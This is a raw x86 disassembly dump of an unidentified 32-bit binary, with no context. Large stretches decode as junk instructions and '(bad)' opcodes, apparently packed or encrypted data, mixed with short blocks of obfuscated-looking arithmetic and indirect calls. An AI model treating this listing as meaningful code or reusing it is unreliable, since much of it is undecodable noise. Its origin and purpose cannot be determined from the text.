  41e7ee:	stos   DWORD PTR es:[edi],eax
  41e7ef:	or     eax,0x3f43f127
  41e7f4:	stc    
  41e7f5:	idiv   BYTE PTR [ebx-0x16b61ccb]
  41e7fb:	cmp    al,bh
  41e7fd:	test   eax,0x6fec843f
  41e802:	adc    al,0xda
  41e804:	inc    ecx
  41e805:	ins    DWORD PTR es:[edi],dx
  41e806:	in     eax,dx
  41e807:	iret   
  41e808:	and    al,0x11
  41e80a:	adc    BYTE PTR [eax+edi*2-0x2dff26df],dl
  41e811:	mov    bl,0xa6
  41e813:	xor    ebx,DWORD PTR [eax-0x5fae4db5]
  41e819:	adc    BYTE PTR [ebp-0x67a1a0fb],bl
  41e81f:	pop    esp
  41e820:	in     al,0x70
  41e822:	adc    edx,edx
  41e824:	(bad)  
  41e825:	mul    BYTE PTR [esi]
  41e827:	cdq    
  41e828:	sahf   
  41e829:	test   DWORD PTR [edi+0x1b],edx
  41e82c:	lock push edi
  41e82e:	push   eax
  41e82f:	cmp    ecx,edx
  41e831:	in     eax,dx
  41e832:	scas   eax,DWORD PTR es:[edi]
  41e833:	sbb    eax,0x9d326be
  41e838:	xchg   BYTE PTR [esi-0x4f],dh
  41e83b:	mov    dl,0x51
  41e83d:	push   ebp
  41e83e:	(bad)  
  41e840:	adc    eax,0x58c12d30
  41e845:	mov    al,ds:0xf6c495e8
  41e84a:	or     eax,0x9bfa50f3
  41e84f:	xor    DWORD PTR [edi+eax*1-0x46],0x79
  41e854:	add    BYTE PTR [ebx-0x8351d55],bl
  41e85a:	je     0x41e8a2
  41e85c:	cmp    eax,0xf2b24938
  41e861:	cmc    
  41e862:	pop    edi
  41e863:	hlt    
  41e864:	lods   eax,DWORD PTR ds:[esi]
  41e865:	shl    cl,1
  41e867:	aas    
  41e868:	jl     0x41e85b
  41e86a:	ror    DWORD PTR [edx+edi*1],cl
  41e86d:	sub    BYTE PTR [eax+0x18104690],dl
  41e873:	sti    
  41e874:	cwde   
  41e875:	(bad)  
  41e877:	ror    ah,0x5c
  41e87a:	mov    cl,0x82
  41e87c:	std    
  41e87d:	in     eax,0x58
  41e87f:	mov    ebx,edx
  41e881:	out    0xd0,al
  41e883:	loope  0x41e8c6
  41e885:	inc    eax
  41e886:	in     eax,dx
  41e887:	sbb    BYTE PTR ds:0xd31d90f4,dl
  41e88d:	aas    
  41e88e:	pusha  
  41e88f:	adc    edx,ebp
  41e891:	push   edx
  41e892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e893:	data16 in al,dx
  41e895:	adc    BYTE PTR [esi],cl
  41e897:	out    dx,al
  41e898:	cmp    DWORD PTR [esi+0x5a],edx
  41e89b:	outs   dx,BYTE PTR ds:[esi]
  41e89c:	push   0xffffffb9
  41e89e:	push   cs
  41e89f:	pop    eax
  41e8a0:	cld    
  41e8a1:	push   esp
  41e8a2:	pusha  
  41e8a3:	faddp  st(2),st
  41e8a5:	lahf   
  41e8a6:	fdivr  st,st(1)
  41e8a8:	leave  
  41e8a9:	push   ecx
  41e8aa:	xchg   edi,eax
  41e8ab:	cs cli 
  41e8ad:	pop    es
  41e8ae:	in     eax,0xfe
  41e8b0:	mov    WORD PTR [edx],es
  41e8b2:	mov    edi,0x85c8dbe
  41e8b7:	cdq    
  41e8b8:	jle    0x41e8c0
  41e8ba:	into   
  41e8bb:	cwde   
  41e8bc:	(bad)  
  41e8bd:	lea    esi,[edx+0x5e2120b1]
  41e8c3:	push   ss
  41e8c4:	mov    bl,0xce
  41e8c6:	test   ch,cl
  41e8c8:	loope  0x41e918
  41e8ca:	cwde   
  41e8cb:	jmp    0xf37d:0xc7adb15e
  41e8d2:	dec    ecx
  41e8d3:	sub    al,0x6c
  41e8d5:	in     eax,dx
  41e8d6:	adc    al,0x1c
  41e8d8:	and    ch,bh
  41e8da:	scas   eax,DWORD PTR es:[edi]
  41e8db:	call   0x9f03:0xffc20cb8
  41e8e2:	js     0x41e865
  41e8e4:	mov    ds,WORD PTR [ebx+0x32]
  41e8e7:	xchg   DWORD PTR [esi+0x7d3fe957],edi
  41e8ed:	push   ecx
  41e8ee:	mov    cl,0x42
  41e8f0:	gs es pop ds
  41e8f3:	push   edx
  41e8f4:	ds scas eax,DWORD PTR es:[edi]
  41e8f6:	xor    eax,0x3480b6fb
  41e8fb:	add    esp,DWORD PTR [edx+0x16]
  41e8fe:	add    eax,0x1af62394
  41e903:	call   0x98c2:0x8cd3eb
  41e90a:	fucom  st(0)
  41e90c:	mov    eax,0xd96377a3
  41e911:	test   al,0xcf
  41e913:	xlat   BYTE PTR ds:[ebx]
  41e914:	pop    ds
  41e915:	sub    BYTE PTR [edx],al
  41e917:	sub    eax,eax
  41e919:	sub    dl,ch
  41e91b:	xor    ecx,DWORD PTR [edx+ebx*4-0x74]
  41e91f:	and    DWORD PTR [ebp+ebp*8-0x78954d58],esi
  41e926:	xlat   BYTE PTR ds:[ebx]
  41e927:	dec    esp
  41e928:	jae    0x41e97d
  41e92a:	repnz mov ds:0x955623ca,eax
  41e930:	mov    edx,DWORD PTR [edi]
  41e932:	stos   DWORD PTR es:[edi],eax
  41e933:	inc    esi
  41e934:	jnp    0x41e8fd
  41e936:	dec    BYTE PTR [esp+esi*1-0x79]
  41e93a:	add    eax,0xfd6530e1
  41e93f:	div    DWORD PTR [ebp+eax*2-0x1202debb]
  41e946:	mov    ch,0xa4
  41e948:	pop    esi
  41e949:	icebp  
  41e94a:	pop    ss
  41e94b:	push   eax
  41e94c:	test   al,0xe
  41e94f:	dec    esi
  41e950:	loopne 0x41e8dc
  41e952:	dec    esp
  41e953:	fwait
  41e954:	sub    DWORD PTR [edi+0x4a31829d],ebx
  41e95a:	call   0x501:0xfb6a7cc
  41e961:	or     eax,DWORD PTR [ecx-0x72]
  41e964:	jg     0x41e971
  41e966:	pop    ecx
  41e967:	cmovae esp,DWORD PTR [esi+0x52886292]
  41e96e:	hlt    
  41e96f:	push   0xee0c84
  41e974:	out    0xc4,al
  41e976:	or     ah,BYTE PTR [edx]
  41e978:	cmp    eax,0x1856c580
  41e97d:	enter  0xf502,0xd6
  41e981:	scas   eax,DWORD PTR es:[edi]
  41e982:	sbb    al,0xb
  41e984:	xlat   BYTE PTR ds:[ebx]
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422658
  41e9a9:	push   DWORD PTR ds:0x4223ec
  41e9af:	mov    eax,ds:0x422568
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422568
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422568
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428277,0x0
  41ea0c:	mov    DWORD PTR ds:0x428383,0x7749
  41ea16:	mov    DWORD PTR ds:0x428183,ebx
  41ea1c:	mov    DWORD PTR ds:0x428323,edx
  41ea22:	mov    DWORD PTR ds:0x428323,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42829b,edx
  41ea37:	cmp    DWORD PTR ds:0x428277,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e24
  41ea54:	sbb    DWORD PTR ds:0x42837f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42832b
  41ea60:	xor    ecx,DWORD PTR ds:0x428317
  41ea66:	mov    DWORD PTR ds:0x42832b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428253,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x4281a7
  41ea80:	mov    ecx,DWORD PTR ds:0x4281f3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428197,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x428207
  41ea95:	mov    eax,ds:0x4282f3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42826b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42829b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42832b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x4283a7,0x4282ff
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428393,0x4283a3
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x428313
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42826b,0x42819f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x4283b7,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428337,0x0
  41eb42:	mov    DWORD PTR ds:0x4283a7,edx
  41eb48:	mov    DWORD PTR ds:0x428247,ebx
  41eb4e:	not    DWORD PTR ds:0x428243
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42823b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428327
  41eb69:	cmp    DWORD PTR ds:0x428337,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e28
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42839f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x4283a7,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42823f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x4282d3
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x4283a3,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42816b,0x4282b7
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42825f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0xdc
  41ec04:	dec    eax
  41ec05:	test   DWORD PTR [esi+ecx*1+0x2f],edi
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx+0x6e181812],ah
  41ec10:	mov    eax,ds:0xe6dfdebf
  41ec15:	sbb    DWORD PTR [edx+0x77da1447],ebp
  41ec1b:	fisttp WORD PTR [edi+0x51910ae4]
  41ec21:	sbb    eax,DWORD PTR [ecx]
  41ec23:	adc    BYTE PTR [edx+ebp*1+0x32a5fab6],ch
  41ec2a:	fwait
  41ec2b:	sbb    DWORD PTR [eax-0x3e],esi
  41ec2e:	std    
  41ec2f:	test   DWORD PTR [esi-0x14],0x1ff6f30c
  41ec36:	fsubrp st(6),st
  41ec38:	push   ss
  41ec39:	shr    DWORD PTR [ebx+ebp*2+0x4f],1
  41ec3d:	inc    edi
  41ec3e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41ec40:	sub    edi,DWORD PTR [eax]
  41ec42:	pop    es
  41ec43:	or     eax,0x66307db9
  41ec48:	sbb    ch,dh
  41ec4a:	ss push ebx
  41ec4c:	dec    edi
  41ec4d:	and    ebx,DWORD PTR [ebp-0x31]
  41ec50:	cmp    bl,ah
  41ec52:	shl    BYTE PTR [edx+0x1be4f3b7],0x37
  41ec59:	outs   dx,BYTE PTR ds:[esi]
  41ec5a:	xchg   esp,eax
  41ec5b:	and    BYTE PTR [ecx+0x572f8fa1],ah
  41ec61:	cmp    al,0x7d
  41ec63:	inc    ebx
  41ec64:	push   esi
  41ec65:	std    
  41ec66:	inc    esp
  41ec67:	out    0xb9,eax
  41ec69:	cmp    DWORD PTR [ebx],edi
  41ec6b:	push   ebx
  41ec6c:	mov    edx,fs
  41ec6e:	(bad)  
  41ec6f:	xchg   esp,eax
  41ec70:	push   esi
  41ec71:	in     al,dx
  41ec72:	xchg   ecx,eax
  41ec73:	aas    
  41ec74:	pusha  
  41ec75:	inc    ecx
  41ec76:	std    
  41ec77:	icebp  
  41ec78:	sbb    ebx,DWORD PTR [ebx-0x515acb74]
  41ec7e:	ins    BYTE PTR es:[edi],dx
  41ec7f:	retf   
  41ec80:	ins    DWORD PTR es:[edi],dx
  41ec81:	gs mov ah,0x63
  41ec84:	mov    ecx,DWORD PTR [ecx]
  41ec86:	cmp    edx,DWORD PTR [edi+0x6c0b331c]
  41ec8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec8d:	adc    BYTE PTR [ebx+0x55],bl
  41ec90:	and    ah,dh
  41ec92:	cmc    
  41ec93:	dec    edi
  41ec94:	add    eax,0x99f33459
  41ec99:	scas   eax,DWORD PTR es:[edi]
  41ec9a:	mov    esp,0xf17bbf9d
  41ec9f:	ja     0x41ecbc
  41eca1:	dec    ebp
  41eca2:	push   DWORD PTR gs:[eax-0x6225fd1b]
  41eca9:	enter  0x6001,0x67
  41ecad:	push   ecx
  41ecae:	rcr    DWORD PTR [ebp+0x6b],0x53
  41ecb2:	adc    ch,cl
  41ecb4:	outs   dx,DWORD PTR ds:[esi]
  41ecb5:	mov    ds:0xb57402d6,eax
  41ecba:	(bad)  
  41ecbb:	aam    0x6f
  41ecbd:	in     al,0x76
  41ecbf:	scas   al,BYTE PTR es:[edi]
  41ecc0:	mov    cs,esp
  41ecc2:	pop    ecx
  41ecc3:	iret   
  41ecc4:	nop
  41ecc5:	sbb    BYTE PTR [esi+0x550d6095],ah
  41eccb:	in     al,dx
  41eccc:	lea    ecx,[ebp+0x12]
  41eccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecd0:	fistp  DWORD PTR [ebx]
  41ecd2:	fiadd  WORD PTR [edx-0x51]
  41ecd5:	jne    0x41ec85
  41ecd7:	stc    
  41ecd8:	out    0x7e,al
  41ecda:	mov    WORD PTR [ebx+0x6ae39b3c],cs
  41ece0:	pop    ebp
  41ece1:	pop    esi
  41ece2:	push   ecx
  41ece3:	adc    DWORD PTR [ecx],ecx
  41ece5:	jb     0x41eca3
  41ece7:	mov    es,WORD PTR [edx+0x40c1cc35]
  41eced:	aad    0x4b
  41ecef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecf0:	push   0xea38e482
  41ecf5:	adc    DWORD PTR [ebx+0x35032d73],ebx
  41ecfb:	retf   0x8db4
  41ecfe:	push   ebx
  41ecff:	pushf  
  41ed00:	cdq    
  41ed01:	shl    BYTE PTR [ecx+0x5b],1
  41ed04:	jnp    0x41ec9a
  41ed06:	sahf   
  41ed07:	pop    esi
  41ed08:	sbb    BYTE PTR [edx+0x1d],al
  41ed0b:	jge    0x41ed86
  41ed0d:	iret   
  41ed0e:	and    ecx,DWORD PTR [ecx+0x45996acb]
  41ed14:	jge    0x41ecb8
  41ed16:	inc    edx
  41ed17:	leave  
  41ed18:	lods   al,BYTE PTR ds:[esi]
  41ed19:	dec    edi
  41ed1a:	adc    bl,0xc2
  41ed1d:	and    DWORD PTR [eax],esp
  41ed1f:	fcmovne st,st(2)
  41ed21:	aam    0xe6
  41ed23:	or     BYTE PTR ds:[ecx-0x4e],0x4c
  41ed28:	jle    0x41ed9c
  41ed2a:	add    al,BYTE PTR [ecx]
  41ed2c:	mov    cl,0x9c
  41ed2e:	dec    edx
  41ed2f:	aam    0x0
  41ed31:	das    
  41ed32:	mov    ecx,0xff925bf6
  41ed37:	mov    BYTE PTR [ecx],bl
  41ed39:	xchg   BYTE PTR [eax+0x1e87245d],al
  41ed3f:	loopne 0x41ecf3
  41ed41:	mov    cl,0x7e
  41ed43:	pop    ebp
  41ed44:	je     0x41ed7b
  41ed46:	call   0xbd19:0x1aa6b080
  41ed4d:	test   BYTE PTR [ebx+0x4d],bh
  41ed50:	mov    esp,0x31aedc6e
  41ed55:	or     ecx,DWORD PTR [edx+0x21da119f]
  41ed5b:	fisubr WORD PTR [edi-0x4c]
  41ed5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed5f:	cmp    ah,BYTE PTR [ecx]
  41ed61:	imul   edi,DWORD PTR [edi-0xa],0x10
  41ed65:	push   0x95553b92
  41ed6a:	in     eax,0x42
  41ed6c:	inc    ebp
  41ed6d:	rcl    BYTE PTR [eax],0xf4
  41ed70:	adc    ecx,esi
  41ed72:	std    
  41ed73:	mov    ch,0x7b
  41ed75:	pushf  
  41ed76:	mov    bh,0xe
  41ed78:	les    ebx,FWORD PTR [ecx]
  41ed7a:	sub    BYTE PTR fs:[ebx],bl
  41ed7d:	jl     0x41edd2
  41ed7f:	jne    0x41edf7
  41ed81:	clc    
  41ed82:	dec    eax
  41ed83:	inc    ebx
  41ed84:	popa   
  41ed85:	and    al,0xab
  41ed87:	add    ebx,DWORD PTR [esi-0x16]
  41ed8a:	sbb    DWORD PTR [edi+ecx*1+0x38b3b2eb],ecx
  41ed91:	fst    QWORD PTR [ebx]
  41ed93:	retf   
  41ed94:	data16 jge 0x41ed53
  41ed97:	std    
  41ed98:	neg    BYTE PTR [ecx+0x28fd624d]
  41ed9e:	inc    eax
  41ed9f:	(bad)  
  41eda0:	xor    BYTE PTR [edx-0x64],al
  41eda3:	push   0x131bb963
  41eda8:	ins    DWORD PTR es:[edi],dx
  41eda9:	mov    edx,0xde335ac6
  41edae:	push   esp
  41edaf:	mov    eax,0x3b09eec8
  41edb4:	cmc    
  41edb5:	mov    al,ds:0x2158f49f
  41edba:	ret    0x6f8a
  41edbd:	sbb    eax,0x7d7f72a9
  41edc2:	pop    edi
  41edc3:	stos   BYTE PTR es:[edi],al
  41edc4:	fcmovu st,st(5)
  41edc6:	xor    al,BYTE PTR [ebp+eiz*8-0x5d]
  41edca:	inc    edi
  41edcb:	xchg   ebp,eax
  41edcc:	or     BYTE PTR [esi],dl
  41edce:	iret   
  41edcf:	xchg   ecx,eax
  41edd0:	mov    esi,0xa39d8ffb
  41edd5:	neg    BYTE PTR [edi]
  41edd7:	pop    ebp
  41edd8:	shl    cl,cl
  41edda:	xchg   ebx,eax
  41eddb:	(bad)  
  41eddc:	cwde   
  41eddd:	and    edx,0xffffffd0
  41ede0:	cwde   
  41ede1:	loop   0x41ee05
  41ede3:	adc    ebp,DWORD PTR [edx+ebp*2]
  41ede6:	dec    ebx
  41ede7:	fldcw  WORD PTR [eax+0x74]
  41edea:	fwait
  41edeb:	lea    edx,[ebp+0x55]
  41edee:	aam    0xb3
  41edf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf1:	jno    0x41ee25
  41edf3:	or     BYTE PTR [ebp+0x7f1e9235],al
  41edf9:	loop   0x41ee23
  41edfb:	rol    ecx,0xde
  41edfe:	lods   eax,DWORD PTR ds:[esi]
  41edff:	gs addr16 ss cmp ebp,ebp
  41ee04:	xchg   edx,eax
  41ee05:	retf   0xcde3
  41ee08:	or     eax,0x675547bb
  41ee0d:	std    
  41ee0e:	sbb    eax,0xc50b98ec
  41ee13:	jp     0x41ee39
  41ee15:	aas    
  41ee16:	stc    
  41ee17:	push   ecx
  41ee18:	mov    dl,0x20
  41ee1a:	pusha  
  41ee1b:	xor    al,0xdd
  41ee1d:	test   eax,0x8c8919ea
  41ee22:	repnz sub BYTE PTR [ebx+eiz*2+0x106709aa],0xbd
  41ee2b:	push   eax
  41ee2c:	mov    cl,0x53
  41ee2e:	mov    ebp,0x35ce0a11
  41ee33:	loop   0x41edc1
  41ee35:	mov    eax,DWORD PTR [edi+eiz*8-0x71437c0a]
  41ee3c:	cli    
  41ee3d:	repnz adc edi,DWORD PTR [edi-0x6ee8fef4]
  41ee44:	imul   edx,DWORD PTR [edx],0xd916fe36
  41ee4a:	aad    0x53
  41ee4c:	sbb    al,0xb3
  41ee4e:	jmp    0x6bd32f26
  41ee53:	aad    0x4b
  41ee55:	jg     0x41ee52
  41ee57:	fsubr  QWORD PTR [eax-0xf3e989e]
  41ee5d:	inc    edi
  41ee5e:	or     al,0xa3
  41ee60:	and    eax,0xac06d4b
  41ee65:	and    edi,ecx
  41ee67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee68:	push   edx
  41ee69:	sbb    DWORD PTR gs:0x116fc718,esi
  41ee70:	and    eax,0x6909dd6
  41ee75:	out    0x33,al
  41ee77:	test   al,0x59
  41ee79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee7a:	adc    al,0x77
  41ee7c:	scas   eax,DWORD PTR es:[edi]
  41ee7d:	scas   al,BYTE PTR es:[edi]
  41ee7e:	xor    BYTE PTR [ebp+0x3f],ch
  41ee81:	aam    0xad
  41ee83:	dec    esi
  41ee84:	adc    al,BYTE PTR [eax+0xc]
  41ee87:	mov    ecx,0x778e8e05
  41ee8c:	sub    eax,0x1cb15571
  41ee91:	sub    DWORD PTR [edi-0x5e294841],eax
  41ee97:	bound  edi,QWORD PTR [eax-0x1223b5a6]
  41ee9d:	pop    ecx
  41ee9e:	inc    esi
  41ee9f:	mov    al,es:0xde426bba
  41eea5:	inc    edx
  41eea6:	or     eax,0x8f23168c
  41eeab:	add    DWORD PTR [ebx+edx*8+0x77767822],ebx
  41eeb2:	sti    
  41eeb3:	add    eax,esi
  41eeb5:	je     0x41eec7
  41eeb7:	push   edx
  41eeb8:	dec    ecx
  41eeb9:	imul   DWORD PTR [ebx-0x75]
  41eebc:	in     al,dx
  41eebd:	jg     0x41ee6c
  41eebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec0:	cmp    al,0x52
  41eec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec4:	xchg   esi,eax
  41eec5:	fisttp WORD PTR [ebx+0x4f554937]
  41eecb:	cmp    ebx,esi
  41eecd:	mov    bl,0x34
  41eecf:	push   es
  41eed0:	(bad)  
  41eed1:	sbb    eax,0x8ada75d6
  41eed6:	fistp  DWORD PTR [esi]
  41eed8:	shl    ecx,cl
  41eeda:	push   eax
  41eedb:	sbb    al,0x8e
  41eedd:	push   esp
  41eede:	pop    esp
  41eedf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eee0:	cmc    
  41eee1:	sub    al,bh
  41eee3:	ret    
  41eee4:	and    BYTE PTR [eax+0x8],bl
  41eee7:	or     BYTE PTR [ebx],0x60
  41eeea:	dec    esi
  41eeeb:	(bad)  
  41eeec:	jb     0x41ee7c
  41eeee:	in     eax,dx
  41eeef:	mov    esi,0x35039c4f
  41eef4:	add    DWORD PTR [esi-0x34],esi
  41eef7:	push   cs
  41eef8:	xchg   esi,eax
  41eef9:	popf   
  41eefa:	pop    esp
  41eefb:	mov    cl,0x1
  41eefd:	fstp   TBYTE PTR [edi+ebx*4]
  41ef00:	fcomp  DWORD PTR [edi-0x4e]
  41ef03:	jb     0x41ef27
  41ef05:	xor    edx,ebx
  41ef07:	test   BYTE PTR [edx],bl
  41ef09:	cli    
  41ef0a:	dec    eax
  41ef0b:	imul   DWORD PTR [ebx-0x74c4e41f]
  41ef11:	add    ebp,DWORD PTR [edx+0xf]
  41ef14:	pop    es
  41ef15:	lds    esi,FWORD PTR [ecx+0x17b8e3d9]
  41ef1b:	push   edi
  41ef1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef1d:	push   cs
  41ef1e:	ror    DWORD PTR [eax],1
  41ef20:	ficom  DWORD PTR [eax]
  41ef22:	jmp    0x2c96:0xb31785e5
  41ef29:	cdq    
  41ef2a:	addr16 mov ?,edx
  41ef2d:	nop
  41ef2e:	jne    0x41ef6c
  41ef30:	sub    BYTE PTR [ebp+0x247d3bea],0x8f
  41ef37:	adc    eax,0xfb154151
  41ef3c:	pop    eax
  41ef3d:	push   cs
  41ef3e:	rcr    esi,cl
  41ef40:	out    0xcc,eax
  41ef42:	jnp    0x41eef3
  41ef44:	dec    DWORD PTR [eax+0x47611120]
  41ef4a:	mov    ch,0xc4
  41ef4c:	pop    ss
  41ef4d:	mov    ah,0x8b
  41ef4f:	inc    ebp
  41ef50:	mov    ah,0x81
  41ef52:	adc    eax,0x42817f
  41ef57:	xchg   ebx,eax
  41ef58:	xor    al,0x0
  41ef5a:	add    BYTE PTR [ebx],al
  41ef5c:	test   DWORD PTR [edi+edi*8-0x1],ecx
  41ef60:	inc    DWORD PTR [ecx+0x29cf2]
  41ef66:	add    BYTE PTR ds:0x2e02,dh
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x4282a3
  41ef7a:	sbb    DWORD PTR ds:0x42817f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428197,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x42830b,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282fb,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x42830b,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e2c
  41efd7:	sub    edx,DWORD PTR ds:0x42823f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42825b
  41efe4:	mov    DWORD PTR ds:0x4283a3,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42824b
  41eff4:	xor    edx,DWORD PTR ds:0x4282b7
  41effa:	and    DWORD PTR ds:0x4283b7,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x6fd1f7b0
  41f021:	mov    al,0x99
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx+0x48181812],ah
  41f02b:	add    BYTE PTR [ebp+0x2f],dh
  41f02e:	push   ecx
  41f02f:	mov    cl,0xc
  41f031:	jns    0x41f03c
  41f033:	aam    0xef
  41f035:	sub    BYTE PTR [ecx],ah
  41f037:	mov    edx,0xa37151f7
  41f03c:	aad    0xb6
  41f03e:	jb     0x41f0b9
  41f040:	mov    ecx,0x79044a2e
  41f045:	sbb    dh,bl
  41f047:	dec    edi
  41f048:	aad    0xc3
  41f04a:	or     ebx,ebx
  41f04c:	mov    ds:0x227adde1,eax
  41f051:	retf   0x451a
  41f054:	arpl   WORD PTR [edi],bp
  41f056:	loopne 0x41f0b1
  41f058:	and    ah,ch
  41f05a:	mov    al,ds:0xde685848
  41f05f:	pop    ecx
  41f060:	(bad)  
  41f061:	dec    ecx
  41f062:	repnz pop es
  41f064:	inc    edi
  41f065:	stc    
  41f066:	rol    DWORD PTR [ecx+ebp*4-0x13],0xa6
  41f06b:	xor    dl,cl
  41f06d:	pop    ds
  41f06e:	jns    0x41f069
  41f070:	pusha  
  41f071:	push   edx
  41f072:	daa    
  41f073:	sub    DWORD PTR cs:[edi],0xffffffa0
  41f077:	fs aam 0xc8
  41f07a:	fdivr  st(5),st
  41f07c:	xlat   BYTE PTR ds:[ebx]
  41f07d:	xchg   edx,eax
